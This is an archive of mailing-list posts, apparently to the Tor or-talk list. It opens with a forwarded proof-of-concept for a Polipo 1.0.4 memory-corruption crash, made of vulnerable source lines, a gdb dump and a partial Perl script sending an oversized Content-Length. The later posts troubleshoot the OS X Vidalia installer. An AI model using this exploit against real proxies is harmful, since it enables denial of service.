
@_date: 2009-12-08 14:01:57
@_author: Darren Thurston 
@_subject: polipo POC 
# estranged.pl
# AKA
# Polipo 1.0.4 Remote Memory Corruption 0day PoC
# Jeremy Brown [0xjbrown41 at gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 12.07.2009
# *********************************************************************************************************
# Hzzp loves you Polipo!
# No use reporting this issue to Ubuntu Security unless you feel like waiting two weeks for them to sit on
# it, then UNFLAG security issue and call it a feature.
# I informally request that they apologize to the developers themselves x)
# polipo-20080907/client.c [1001-1009]:
#     if(connection->reqlen > connection->reqbegin) {
#         memmove(connection->reqbuf, connection->reqbuf + connection->reqbegin,
#                 connection->reqlen - connection->reqbegin);
#         connection->reqlen -= connection->reqbegin;
#         connection->reqbegin = 0;
#     } else {
#         connection->reqlen = 0;
#         connection->reqbegin = 0;
#     }
# 0.9.8 / 1.0.4 tested vulnerable
# Program received signal SIGSEGV, Segmentation fault.
# 0x40093486 in memmove () from /lib/libc.so.6
# (gdb) i r
# eax            0x80000000	-2147483648
# ecx            0x2	2
# edx            0x8000002c	-2147483604
# ebx            0x80775d8	134706648
# esp            0xbffff7f0	0xbffff7f0
# ebp            0xbffff7f8	0xbffff7f8
# esi            0x4017002d	1075249197
# edi            0xc017002d	-1072234451
# eip            0x40093486	0x40093486
# eflags         0x10686	67206
# cs             0x23	35
# ss             0x2b	43
# ds             0x2b	43
# es             0x2b	43
# fs             0x0	0
# gs             0x0	0
# (gdb) bt
  0x40093486 in memmove () from /lib/libc.so.6
  0x0805a594 in ?? ()
  0x40170000 in ?? ()
  0xc0170000 in ?? ()
  0x8000002e in ?? ()
  0x0804e744 in ?? ()
  0x08077548 in ?? ()
  0x08077550 in ?? ()
  0x00000001 in ?? ()
  0x0000000a in ?? ()
 0x00000001 in ?? ()
 0x080775d8 in ?? ()
 0xbffff908 in ?? ()
 0x0805a458 in ?? ()
 0x08077498 in ?? ()
 0x00000001 in ?? ()
 0x00000001 in ?? ()
 0x00000001 in ?? ()
 0x00000001 in ?? ()
 0x0805eb8d in ?? ()
 0x00000000 in ?? ()
 0xbffff8d0 in ?? ()
 0xbffff8ac in ?? ()
 0xbffff8b0 in ?? ()
 0x00000000 in ?? ()
 0x00000000 in ?? ()
 0x00000000 in ?? ()
 0x00000000 in ?? ()
 0x00000000 in ?? ()
 0x00000000 in ?? ()
 0x00000000 in ?? ()
 0x00000000 in ?? ()
 0xbffff8b4 in ?? ()
 0xbffff8c0 in ?? ()
 0x00000000 in ?? ()
 0x00000000 in ?? ()
 0xbffff8b8 in ?? ()
 0xbffff8bc in ?? ()
 0x40170003 in ?? ()
 0x0806f803 in _IO_stdin_used ()
 0x08077550 in ?? ()
 0x4008dc91 in mallopt () from /lib/libc.so.6
# Previous frame inner to this frame (corrupt stack?)
# (gdb)
 x/i $eip
 :	repz movsb %ds:(%esi),%es:(%edi)
# "And my hair cannot commit, to one popular genre of music"
# *********************************************************************************************************
# estranged.pl
use IO::Socket;
$target = $ARGV[0];
$port   = 8123;
$payload = "GET / HTTP/1.1\r\nContent-Length: 2147483602\r\n\r\n";
$sock = IO::Socket::INET->new(Proto=>'tcp', PeerHost=>$target, PeerPort=>$port) or die "Error: $target:$port\n";
To unsubscribe, send an e-mail to majordomo at torproject.org with
unsubscribe or-talk    in the body.

@_date: 2009-11-01 23:30:45
@_author: Darren Thurston 
@_subject: OS X stable test package with Vidalia 0.2.6-svn 
Tested out working fine on a base 10.6 system.
Thanks Andrew.
To unsubscribe, send an e-mail to majordomo at torproject.org with
unsubscribe or-talk    in the body.

@_date: 2009-10-30 22:30:48
@_author: Darren Thurston 
@_subject: osx installer problems on several machines 
# Forwarding these emails here along with the fix, from or-dev
How do I file a bug report? I ran into this FAIL on two seperate Apple  machines last night at Tor Night at the VanHackSpace. Tried on a fresh  install here with same results. I still have not narrowed down what is  causing the problem, it looks like the browser is not connecting to  the polipo from what I can tell.
any ideas?
# Installed new system 10.6 base no updates on MacBook
# Installed Firefox 3.5.4
# Installed vidalia package: vidalia-bundle-0.2.1.20-0.2.5-i386.dmg
 the "Install Torbutton for Firefox" script
 Vidalia tor start fine and connects to a circuit fine, log  Oct 30 19:58:23.209 [Notice] Tor v0.2.1.20. This is experimental  software. Do not rely on it for strong anonymity. (Running on Darwin  Oct 30 19:58:23.224 [Notice] Initialized libevent version 1.4.12- stable using method kqueue. Good.
Oct 30 19:58:23.224 [Notice] Opening Socks listener on 127.0.0.1:9050
Oct 30 19:58:23.224 [Notice] Opening Control listener on 127.0.0.1:9051
Oct 30 19:58:23.568 [Notice] This version of Tor (0.2.1.20) is newer  than any recommended version in its series, according to the directory  authorities. Recommended versions are:  0.2.0.34,0.2.0.35,0.2.1.19,0.2.2.1-alpha,0.2.2.2-alpha,0.2.2.3-alpha, Oct 30 19:58:24.216 [Notice] We now have enough directory information  to build circuits.
Oct 30 19:58:24.217 [Notice] Bootstrapped 80%: Connecting to the Tor  Oct 30 19:58:24.394 [Notice] Bootstrapped 85%: Finishing handshake  with first hop.
Oct 30 19:58:27.874 [Notice] Bootstrapped 90%: Establishing a Tor  Oct 30 19:58:32.793 [Notice] Tor has successfully opened a circuit.  Looks like client functionality is working.
Oct 30 19:58:32.795 [Notice] Bootstrapped 100%: Done.
 Firefox and it gives me the alert:
The proxy server is refusing connections
Firefox is configured to use a proxy server that is refusing      *   Check the proxy settings to make sure that they are correct.
    *   Contact your network administrator to make sure the proxy  server is
          working.
 tells me their all the correct things are running:
202- polipo       0.0       00:00.00 1    0    14   28   120K   240K    201- tor          0.0       00:01.27 1    0    18   43   5344K  1128K   197- Vidalia      0.0       00:08.25 6    1    107  188  14M    31M      From what I can tell the proxy settings in FF are set correctly:
HTTP Proxy 127.0.0.1:8118
SSL Proxy 127.0.0.1:8118
SOCKS 5 127.0.0.1:9050
and it looks like all the settings are correct in Vidalia
cat torrc
# This file was generated by Tor; if you edit it, comments will not be  # The old torrc file was renamed to torrc.orig.1 or similar, and Tor  will ignore it
# If set, Tor will accept connections from the same machine (localhost  # on this port, and allow those connections to control the Tor process  # the Tor Control Protocol (described in control-spec.txt).
ControlPort 9051
# Store working data, state, keys, and caches here.
DataDirectory /Users/sand/.tor/
HashedControlPassword  # Where to send logging messages.  Format is minSeverity[-maxSeverity]
# (stderr|stdout|syslog|file FILENAME).
Log notice stdout
cat vidalia.conf
InterfaceStyle=Macintosh (aqua)
Geometry= \0\x1\0\0\0\0\x1\xc2\0\0\0\xe9\0\0\x5\x37\0\0\x2\xba Geometry= \0\0\x4\xcc\0\0\x2\x37\0\0\x3\x32\0\0\0\x8d\0\0\x4\xcc Geometry= \0\0\0\xf8\0\0\x2\x82\0\0\x1<\0\0\x1h\0\0\x1\xe\0\0\x2\x82\0\0\x1< Geometry= \0\0\0\xf8\0\0\x4\xb3\0\0\x3\x61\0\0\x1h\0\0\x1\xe Geometry= Geometry=" To unsubscribe, send an e-mail to majordomo at torproject.org with
unsubscribe or-talk    in the body.

@_date: 2009-10-30 22:31:34
@_author: Darren Thurston 
@_subject: osx installer ( 0.2.2.5-alpha ) same problems 
Just thought I'd try 0.2.2.5-alpha and see if it might work. No luck  at all either, same problems.
sudo rm -rf /Applications/Vidalia.app/
sudo rm -rf /Library/Torbutton/
sudo rm -rf ~/Library/Vidalia
sudo rm -rf ~/.tor
also removed FireFox
# Installed Firefox 3.5.4
# Installed vidalia package: vidalia-bundle-0.2.2.5-alpha-0.2.5-i386.dmg
 the "Install Torbutton for Firefox" script
 Vidalia tor start fine and connects to a circuit fine, log  Oct 30 21:34:21.236 [Notice] Tor v0.2.2.5-alpha  (git-255245a2891cfa56). This is experimental software. Do not rely on  it for strong anonymity. (Running on Darwin i386)
Oct 30 21:34:21.238 [Notice] Initialized libevent version 1.4.12- stable using method kqueue. Good.
Oct 30 21:34:21.238 [Notice] Opening Socks listener on 127.0.0.1:9050
Oct 30 21:34:21.239 [Notice] Opening Control listener on 127.0.0.1:9051
Oct 30 21:34:22.171 [Notice] We now have enough directory information  to build circuits.
Oct 30 21:34:22.171 [Notice] Bootstrapped 80%: Connecting to the Tor  Oct 30 21:34:22.458 [Notice] Bootstrapped 85%: Finishing handshake  with first hop.
Oct 30 21:34:25.575 [Notice] Bootstrapped 90%: Establishing a Tor  Oct 30 21:34:30.853 [Notice] Tor has successfully opened a circuit.  Looks like client functionality is working.
Oct 30 21:34:30.855 [Notice] Bootstrapped 100%: Done.
 as last email no connection same errors in FireFox
To unsubscribe, send an e-mail to majordomo at torproject.org with
unsubscribe or-talk    in the body.

@_date: 2009-10-30 22:35:44
@_author: Darren Thurston 
@_subject: bug tracker and fix 
Found the tor and vidalia bug trackers, looks like the OSX installer  has been broken since at least 9.01.09 ticket Fix below works great (thanks Andrew): change your /Library/Vidalia/ vidalia.conf file from:
ProxyExecutableArguments=-c, /Applications/Vidalia.app/Contents/ ProxyExecutableArguments=-c \
To unsubscribe, send an e-mail to majordomo at torproject.org with
unsubscribe or-talk    in the body.

@_date: 2010-07-20 19:14:48
@_author: Darren Thurston 
@_subject: mac and tor with little snitch 
Normally LittleSnitch will stop and throw up an alert for tor traffic. Which you can allow as per any normal connection.
By a "global proxy" setting do you mean you have used the Proxy setting in /System Preferences/Network/  ?
Darren Darren Thurston - darren.t.thurston at gmail.com
PGP Key ID: 0x6E43BED7
Fingerprint: A596 0ED5 CD20 A620 0038 A917 CEC4 E5BB 6E43 BED7
To unsubscribe, send an e-mail to majordomo at torproject.org with
unsubscribe or-talk    in the body.
